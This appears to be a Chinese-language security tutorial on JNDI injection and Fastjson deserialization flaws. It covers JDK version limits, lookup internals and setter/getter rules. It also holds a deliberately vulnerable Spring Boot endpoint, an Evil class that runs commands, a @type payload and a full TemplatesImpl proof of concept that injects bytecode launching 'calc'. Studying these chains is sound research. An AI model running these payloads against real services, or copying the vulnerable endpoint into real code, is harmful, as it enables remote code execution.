### 利用JNDI References进行注入（LDAP）
JNDI对接LDAP服务时，除了lookup时指定LDAP地址：`ldap://xxx`外没什么区别。但是由于上面提到的安全管理器，LDAP不受`com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase`等属性的限制，加上新加入了`com.sun.jndi.ldap.object.trustURLCodebase`，所以利用版本不同。
这里总结一张JNDI注入对版本要求的表：
JNDI服务 | 需要的安全属性值 | version | 备注  
---|---|---|---  
RMI | java.rmi.server.useCodebaseOnly==false | jdk>=6u45、7u21 true |
true时禁用自动远程加载类  
RMI、CORBA | com.sun.jndi.rmi.object.trustURLCodebase==true |
jdk>=6u141、7u131、8u121 false | flase禁止通过RMI和CORBA使用远程codebase  
LDAP | com.sun.jndi.ldap.object.trustURLCodebase==true |
jdk>=8u191、7u201、6u211 、11.0.1 false | false禁止通过LDAP协议使用远程codebase  
## JNDI lookup()解析
`java.naming.InitialContext.java#lookup()`：
持续跟进lookup到`com.sun.jndi.rmi.registry.RegistryContext.class`，lookup：lookup获取RMI服务器上的对象引用，赋值给var2(拷贝对象到注册表)
    var2 = this.registry.lookup(var1.get(0));
随后执行decodeObject:
decodeObject会判断RMIServer绑定的类是否为RemoteReference的子类(var1)，是的话用getReference()获取Reference类，赋值给var3
随后执行NamingManager.getObjectInstance()，在此函数内执行了getObjectFactoryReference
跟进getObjectFactoryReference():可以看到第一个try并没有用到codebase，意味着首先是在本地寻找类，如果没有才执行第二个try加载codebase上的远程类。最后用newInstance()实例化
`clas=helper.loadClass(factoryName)`采用反射的方式获取类名。在if判断里根据Reference的ClassName和codebase(如`rmi://ip:port/`)来加载factory类
## Fastjson前置知识
### Fastjson使用
pom.xml添加fastjson依赖，jdbcRowSetImpl链需要fastjson
        com.alibaba
        fastjson
        1.2.24
可以利用`JSON.toJSONString()`将对象 **序列化** 为json字符串。
反序列化：`JSON.parseObject()`、`JSON.parse`
parseObject()返回fastjson.JSONObject类，而parse返回类User
在parseObject构造函数指定为Object类，可以起到parse的作用
    String jsons = "{\"@type\":\"fastjsonvul.User\",\"name\":\"godown\"}";
    Object user = JSON.parseObject(jsons,Object.class);
  * `@type`参数指定反序列化后的类名，然后自动调用该类的setter、getter以及构造函数
>
> 如果不知道getter,setter，可以看一下javaBean:
测试：
恶意类Evil：
    public class Evil {
        String cmd;
        public Evil(){
        }
        public void setCmd(String cmd) throws Exception{
            this.cmd = cmd;
            Runtime.getRuntime().exec(this.cmd);
        }
        public String getCmd(){
            return this.cmd;
        }
        @Override
        public String toString() {
            return "Evil{" +
                    "cmd='" + cmd + '\'' +
                    '}';
        }
    }
server:
springboot起的服务器，记得导入依赖：
            org.springframework.boot
            spring-boot-starter-parent
            2.1.3.RELEASE
                org.springframework.boot
                spring-boot-starter-web
    package org.example;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.Feature;
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.RequestParam;
    import org.springframework.web.bind.annotation.RestController;
    @RestController
    public class FastVuln1 {
        @RequestMapping("/fast1")
        public String FastVuln1(@RequestParam(name="user") String user) throws Exception{
            Object obj = JSON.parseObject(user,Object.class, Feature.SupportNonPublicField);
            System.out.println(obj.getClass().getName());
            return user;
        }
    }
`@RestController`的意思就是controller里面的方法都以json格式输出
`@RequestMapping`注解在FastVuln1方法处，表示映射类到url路径fast1，能处理所有HTTP请求
`@RequestParam`注解在String cmd参数处，表示接收URL中的cmd参数，接收不到会报错
> 注解：
向url：`http://localhost:xxx/fast1` POST传参 payload：`user =
{"@type":"org.example.Evil","cmd":"calc"}`
> 我用get方式传参出现了错误，会报`The valid characters are defined in RFC 7230 and RFC
> 3986`异常，url中不允许包含@或者一些其他的特殊字符
>
> fastJson默认不反序列化私有属性，parseObject加上`Feature.SuppertNonPublicField`对私有属性进行反序列化
### getter、setter 源码分析
在javaBeanInfo#build()方法，利用反射将 反序列化后`@type`指定类
的方法、属性、构造器存入buildClass,declaredFields数组和method数组
buile()方法里面还有if 判断构造函数是否存在&&传入类是否为抽象类或者接口
下面看对method的判断（也就是setter的定义)
方法名开头是否为set
  1. 方法名长度不能小于4
  2. 不能是静态方法
  3. 返回的类型必须是void 或者是自己本身
  4. 传入参数个数必须为1
  5. 方法开头必须是set
在if(methodName.startWith("set"))内，charAt(3)返回method第四个字符，根据ascii码进行截断
如果经过截断还是找不到属性或者为Boolean，就在截断后的变量前加is，然后对相应字符大写进行拼接，然后重新寻找属性
最后将相应属性方法等内容添加到fieldInfo
getter的判断也差不多，直接给出要求：
  1. 方法名长度不小于4
  2. 不能是静态方法
  3. 方法名要get开头同时第四个字符串要大写
  4. 方法返回的类型必须继承自Collection Map AtomicBoolean AtomicInteger AtomicLong
  5. 传入的参数个数需要为0
## fastJson TemplatesImpl链
版本：fastjson 1.2.22-1.2.24
TemplatesImpl链构造的恶意类为Object，但是在fastJson序列化中，只有两种方式能接收Object类（并且要设置Feature.SupportNonPublicField，恢复private属性）,但是在1.2.22才出现该属性，1.2.24后又加了很多黑名单和白名单
我们构造的PoC中有private的成员变量`_bytecodes`和`_name`
    1. parseObject(input,Object.class,Feature.SupportNonPublicField)//不设置Object会返回JSONObject
    2. parse(input,Feature.SupportNonPublicField)
TemplatesImpl链有两种，一种是newTransformer()作为入口；一种是getOutputProperties()作为入口，这里用到的是第二种
    TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()-> TransletClassLoader#defineClass()
POC如下：
    package org.example;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.Feature;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import javassist.*;
    import java.util.Base64;
    public class fastjsonpoc1 {
        public static String generateEvil() throws Exception {
            ClassPool pool = ClassPool.getDefault();
            CtClass clas = pool.makeClass("Evil");
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            String cmd = "Runtime.getRuntime().exec(\"calc\");";
            clas.makeClassInitializer().insertBefore(cmd);
            clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));
            clas.writeFile("./");
            byte[] bytes = clas.toBytecode();
            String EvilCode = Base64.getEncoder().encodeToString(bytes);
            System.out.println(EvilCode);
            return EvilCode;
        }
        public static void main(String[] args) throws Exception {
            final String GADGAT_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String evil = fastjsonpoc1.generateEvil();
            String PoC = "{\"@type\":\"" + GADGAT_CLASS + "\",\"_bytecodes\":[\"" + evil + "\"],'_name':'a.b','_tfactory':{},\"_outputProperties\":{ }," + "\"allowedProtocols\":\"all\"}\n";
            JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);
        }
    }
> poc1类用来构造恶意字节码。ClassPool.getDefult()获取默认类池后，创建类Evil
>
> 设置要继承的类
>  
>  
>     pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
>  
>
> 创建一个空的类初始化器（静态构造函数）
>  
>  
>     CtConstructor constructor = test.makeClassInitializer();
>  
>
> 向构造函数里加入cmd，也就是exec函数
>  
>  
>     constructor.insertBefore(cmd);
>  
>
> 设置加载AbstractTranslet类的搜索路径
>  
>  
>     clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName())
>  
>
> 将编译的类创建为`.class` 文件
>  
>  
>     test.writeFile("./");
>  
  * TemplatesImpl加载的字节码必须为AbstractTranslet子类，因为defineTransletClasses里会对传入类进行一次判断